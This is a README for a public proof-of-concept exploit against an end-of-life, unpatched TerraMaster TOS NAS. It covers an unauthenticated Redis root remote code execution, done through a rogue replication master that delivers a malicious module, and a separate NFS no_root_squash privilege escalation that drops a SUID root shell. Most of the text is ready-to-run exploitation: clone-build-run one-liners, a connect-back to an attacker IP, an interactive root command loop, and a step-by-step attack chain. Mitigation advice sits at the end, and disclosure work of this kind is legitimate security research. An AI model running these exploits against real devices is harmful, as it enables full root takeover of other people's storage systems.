# TossUp: TerraMaster TOS Redis RCE

<p align="center">
<img width="50%" alt="tossup logo" src="https://github.com/user-attachments/assets/8ed17d2c-f42f-4d9f-a5fc-c9f294a8ab5d" />
</p>

## Abstract

TossUp is a pair of bugs against TerraMaster TOS3_A1.0 4.2.41 on RTD1296
devices: an unauthenticated Redis root RCE and a separate NFS
`no_root_squash` local privilege escalation.

TossUp was discovered with [V12](https://v12.sh) by Aaron Esau of the
[V12 security team](https://x.com/v12sec).

> Want to find issues like this in your own code? Try V12 at [v12.sh](https://v12.sh).

The LPE is not part of the Redis RCE chain because the RCE already executes as
root.

We also have a separate authentication bypass, likely upgradable to RCE, which
we will release in the near future.

The bug is simple: the NAS ships Redis 4.0.10 running as root, listening on
`0.0.0.0:6379`, with no authentication. The on-disk `/etc/redis.conf` contains
`bind 127.0.0.1`, but the init path starts Redis as `redis-server *:6379`
without using that config file.

The PoC uses standard Redis features to turn that exposure into root RCE:

1. `CONFIG SET` changes Redis' working directory and database filename.
2. `SLAVEOF` points the NAS at a rogue Redis master controlled by the attacker.
3. The rogue master sends an AArch64 Redis module as the replication payload.
4. Redis writes the payload to disk as `/tmp/.<random>.so`.
5. `MODULE LOAD` loads the module and registers `system.exec`.
6. `system.exec` runs shell commands through `popen()` as the Redis process,
   which is root on the tested device.

We reported this to TerraMaster who stated TOS4 is EOL. They have not indicated intent to fix the bug, so we are releasing our POC.

## "TossUp"?

Because it's TOS and you upload a malicious module.

## Exploitation

Build the Redis module:

```
cd terramaster/rce
make
```

Run one command as root:

```
python3 poc.py <NAS_IP> --cmd "id"
```

Or start the interactive command loop:

```
python3 poc.py <NAS_IP>
```

One-line version:

```
git clone https://github.com/v12-security/pocs.git && cd pocs/terramaster/rce && make && python3 poc.py <NAS_IP> --cmd "id"
```

If the NAS cannot route back to the automatically selected attacker IP, provide
one explicitly:

```
python3 poc.py <NAS_IP> --lhost <ATTACKER_IP> --cmd "id"
```

The target must expose TCP/6379 to you, and it must be able to connect back to
the temporary rogue-master listener opened by `poc.py`.

## Building

The `rce/Makefile` builds an AArch64 Redis module:

```
aarch64-linux-gnu-gcc -shared -fPIC -nostartfiles -o module.so module.c
```

Install an AArch64 cross-compiler if `make` fails with a missing compiler
error. A prebuilt `module.so` is included for the tested RTD1296 target, but
rebuilding is recommended if you change the module or do not want to run the
checked-in binary.

## Cleanup

The PoC attempts to clean up after itself:

- `SLAVEOF NO ONE`
- restore the original Redis `dir`
- restore the original Redis `dbfilename`
- remove the dropped `/tmp/.<random>.so`
- `MODULE UNLOAD system`

If the script is interrupted after module loading, unload it manually:

```
redis-cli -h <NAS_IP> MODULE UNLOAD system
```

The dropped module path is printed during exploitation. Remove that file from
the NAS if cleanup did not run.

## How It Works

1. **Unauthenticated Redis check.** `poc.py` connects to `<NAS_IP>:6379`, sends
   `PING`, and expects `+PONG`. It also queries `INFO server` to print useful
   Redis details such as `redis_version`, `os`, `process_id`, and `tcp_port`.

2. **Drop-path setup.** The current Redis `dir` and `dbfilename` are saved.
   The PoC then sets `dir` to `/tmp` and `dbfilename` to a random hidden
   `.so` name.

3. **Rogue master startup.** The PoC opens a local TCP listener on an ephemeral
   port. If `--lhost` is not provided, it chooses the local source address that
   can reach the NAS.

4. **Replication trigger.** The PoC sends `SLAVEOF <lhost> <lport>` to the NAS.
   Redis connects back to the rogue master and starts the normal replication
   handshake.

5. **Module delivery.** The rogue master implements just enough Redis
   replication protocol to answer `PING`/setup commands and then return
   `FULLRESYNC` with `module.so` as the bulk payload. Redis writes that payload
   to `/tmp/.<random>.so`.

6. **State restoration.** The PoC sends `SLAVEOF NO ONE` and restores the saved
   `dir` and `dbfilename` values so Redis is no longer pointed at the rogue
   master or `/tmp`.

7. **Module load.** The PoC reconnects, verifies Redis still does not require
   auth, and sends `MODULE LOAD /tmp/.<random>.so`.

8. **Root command execution.** `module.c` registers a Redis command named
   `system.exec`. Each call runs the supplied command with `popen()`, captures
   up to 8191 bytes of stdout, and returns it as a Redis simple string.

9. **Interactive loop.** Without `--cmd`, `poc.py` provides a simple
   `root@<host>#` command prompt over repeated `system.exec` calls. This is not
   a real TTY; it is a command loop.

## Separate LPE: NFS no_root_squash

The `lpe/` directory contains a separate TerraMaster TOS local privilege
escalation. It is not needed for TossUp because the Redis RCE already executes
as root, but it is useful as a standalone issue for systems where an attacker
has code execution as an unprivileged NAS user.

The LPE abuses an NFS export that allows remote root to create root-owned files
on the NAS. `drop.sh` mounts the export from the client, copies a static
AArch64 helper binary, sets owner `0:0`, and sets mode `4755`. If the export is
not root-squashed, the NAS keeps those attributes. Any local NAS user can then
execute the dropped helper to get a root shell or run one command as root.

Build and drop the helper:

```
cd terramaster/lpe
make
sudo ./drop.sh <NAS_IP>
```

If auto-detection chooses the wrong export, provide one explicitly:

```
sudo ./drop.sh <NAS_IP> <export_path>
```

On success the script prints the dropped path:

```
[+] SUID-root binary dropped at <export_path>/.suid
```

Then, on the NAS as any user:

```
<export_path>/.suid
<export_path>/.suid id
```

The helper in `suid.c` is intentionally minimal: it calls `setuid(0)` and
`setgid(0)`, then either execs the supplied command or falls back to `/bin/sh`.

## Affected Versions

Confirmed on:

```
TOS3_A1.0 4.2.41
Redis 4.0.10
RTD1296 / AArch64
```

Other TerraMaster builds may be affected if all of these conditions hold:

- Redis listens on `0.0.0.0:6379`
- Redis has no authentication
- Redis accepts `CONFIG SET`, `SLAVEOF`, and `MODULE LOAD`
- Redis runs as root
- the loaded module matches the NAS CPU architecture

The NFS LPE is separate and depends on different conditions:

- the NAS exposes an NFS export reachable by the client
- the export allows writes from the client
- the export does not squash remote root
- the dropped helper matches the NAS CPU architecture

## Mitigation

For owners who do not want this behavior:

- block TCP/6379 from untrusted networks
- make Redis bind only to localhost
- require Redis authentication
- disable or rename dangerous Redis commands such as `CONFIG`, `SLAVEOF`, and
  `MODULE`
- fix the init path so Redis actually uses the intended config file
- run Redis as an unprivileged service user
- root-squash NFS exports and avoid writable exports to untrusted clients

Because the tested product is EOL, network isolation is the practical first
line of defense.

## Credit

Found with V12 by Aaron Esau of the V12 security team: [v12.sh](https://v12.sh)
-- dangerously powerful agentic security.
